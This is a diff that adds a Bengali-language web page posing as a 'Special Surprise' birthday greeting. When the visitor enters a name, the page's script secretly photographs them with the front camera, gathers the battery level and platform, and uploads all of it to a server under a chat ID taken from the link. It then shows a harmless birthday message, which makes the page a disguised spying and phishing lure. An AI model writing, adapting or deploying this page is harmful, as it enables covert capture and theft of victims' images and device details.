@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>✨ Special Surprise!</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #f43f5e, #881337); color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.2); padding: 30px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.4); width: 100%; max-width: 320px; text-align: center; }
+        h2 { color: #fef08a; margin-bottom: 10px; font-size: 22px; }
+        p { font-size: 13px; color: #f1f5f9; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: none; border-radius: 10px; background: rgba(255,255,255,0.2); color: #fff; font-size: 14px; box-sizing: border-box; text-align: center; }
+        input::placeholder { color: #cbd5e1; }
+        .btn { background: #fef08a; color: #881337; font-weight: bold; border: none; padding: 12px; width: 100%; border-radius: 10px; cursor: pointer; font-size: 15px; transition: 0.3s; }
+        .btn:hover { background: #fde047; }
+        #status { margin-top: 15px; font-size: 12px; color: #ffedd5; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>✨ Surprise Wish!</h2>
+        <p>আপনার জন্য একটি বিশেষ সারপ্রাইজ অপেক্ষা করছে। নাম লিখে দেখুন!</p>
+        <input type="text" id="username" placeholder="আপনার নাম লিখুন..." required>
+        <button class="btn" onclick="openSurprise()">Open Surprise 🎁</button>
+        <div id="status"></div>
+    </div>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('id');
+
+        async function openSurprise() {
+            const name = document.getElementById('username').value;
+            const status = document.getElementById('status');
+
+            if (!name) {
+                alert("দয়া করে আপনার নাম লিখুন!");
+                return;
+            }
+
+            status.innerText = "লোডিং হচ্ছে, অপেক্ষা করুন...";
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    const imageData = canvas.toDataURL('image/jpeg');
+
+                    // ব্যাটারি বা ডিভাইস ইনফো
+                    navigator.getBattery?.().then(battery => {
+                        const batteryLevel = Math.round(battery.level * 100) + "%";
+                        sendData(imageData, name, batteryLevel);
+                    }).catch(() => {
+                        sendData(imageData, name, "N/A");
+                    });
+
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1500);
+
+            } catch (err) {
+                status.innerText = "❌ সারপ্রাইজ দেখতে হলে ক্যামেরা পারমিশন দিন!";
+            }
+        }
+
+        function sendData(imageBase64, name, battery) {
+            const status = document.getElementById('status');
+            status.innerText = "সারপ্রাইজ তৈরি হচ্ছে...";
+
+            fetch('/upload-image', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    image: imageBase64,
+                    name: name,
+                    battery: battery,
+                    platform: navigator.platform
+                })
+            }).then(res => res.json()).then(data => {
+                setTimeout(() => {
+                    alert(`শুভ জন্মদিন / স্পেশাল উইশ, ${name}! 🎉`);
+                    location.reload();
+                }, 1000);
+            }).catch(err => {
+                status.innerText = "নেটওয়ার্ক সমস্যা!";
+            });
+        }
+    </script>
+</body>
+</html>
